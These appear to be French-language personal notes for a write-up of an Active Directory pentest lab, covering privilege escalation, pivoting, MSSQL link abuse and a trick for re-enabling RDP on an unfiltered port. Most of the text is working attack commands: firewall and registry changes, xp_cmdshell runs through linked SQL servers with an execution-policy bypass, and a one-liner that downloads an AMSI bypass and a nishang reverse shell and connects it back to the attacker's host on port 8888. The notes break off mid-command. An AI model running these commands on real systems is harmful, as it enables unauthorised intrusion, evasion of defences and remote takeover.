
-----------------


-privesc de la machine puis ssf avec proxychains
-Parler des tools utilisés (ceux dans le Rep tools de la VM)
-Parler des façons unintended d avoir pown le lab
-Parler des sites notamment ceux de harmjoy, S4U2Pwnage, ...
-mettre des lignes de commandes utiles (des notes du lab, de keepnote - powershell et domain local enumeration)
-faire un article sur les commandes MSSQL (RPC OUT, OPENROWSET, EXECUTE AS)
-use maximum les lolbin (lien sur le site des lolbins)
-try to clean after you passed
-netsh pour les pivots
-le trick pour réactiver 3389 sans reboot (le mieux, desactiver winrm, utiliser smbexec en modifiant le port pour pivot 4445, et changer le port TermService sur 5985 car non filtré):
Depuis un WinRM:
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\" -Name PortNumber -Value 5985
New-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In) 8888" -Direction Inbound –Protocol TCP -Profile Any –LocalPort 8888 -Action allow
New-NetFirewallRule -DisplayName "Remote Desktop - User Mode (UDP-In) 8888" -Direction Inbound –Protocol UDP -Profile Any –LocalPort 8888 -Action allow
sc.exe stop WinRM

Depuis un smbexec:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
C:\Windows\system32>netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING


-ls \\DC\pipe\spoolss

'UFC-SQLDEV' is not configured for RPC OUT.
spoolss DC n'est pas activé sur les DCs, mais l'est sur les serveurs

Get-SQLServerLinkCrawl -Instance ufc-sqldev -Verbose -Query "EXEC xp_cmdshell 'powershell.exe -ep bypass -noprofile -C """"whoami""""'" -QueryTarget AC-DBBUSINESS | Select -ExpandProperty Cus
tomquery

Get-SQLServerLinkCrawl -Instance ufc-sqldev -Verbose -Query "EXEC xp_cmdshell 'powershell.exe -ep bypass -noprofile -C """"New-Object System.Net.Sockets.TcpClient(''192.168.2.90'', ''445'')""
""'" -QueryTarget AC-DBBUSINESS | Select -ExpandProperty Customquery

Get-SQLServerLinkCrawl -Instance ufc-sqldev -Verbose -Query "EXEC xp_cmdshell 'powershell.exe -ep bypass -noprofile -C """"iex (New-Object Net.WebClient).DownloadString(''http://192.168.50.15
3:8080/amsi-bypass.ps1'');[Bypass.A_M_S_I]::Disable();iex (New-Object Net.WebClient).DownloadString(''http://192.168.50.153:8080/nishang/Shells/Invoke-PowerShellTcp.ps1'');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.50.153 -Port
 8888""""'" -QueryTarget AC-DBBUSINESS | Select -ExpandProperty Customquery

EXEC xp_cmdshell 'powershell.exe -ep bypass -noprofile -C "iex (New-Object Net.WebClient).DownloadString(''http://192.168.2.90:8080/amsi-bypass.ps1'');[Bypass.A_M_S_I]::Disable();iex (New-Object Net.WebClient).DownloadString(''http://192.168.2.90:8080/nishang/Shells/Invoke-PowerShellTcp.ps1'');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.2.90 -Port 8888"'

Get-ChildItem -Path .\ -Filter dbbackup.sql -Recurse -ErrorAction SilentlyContinue -Force
Invoke-Sq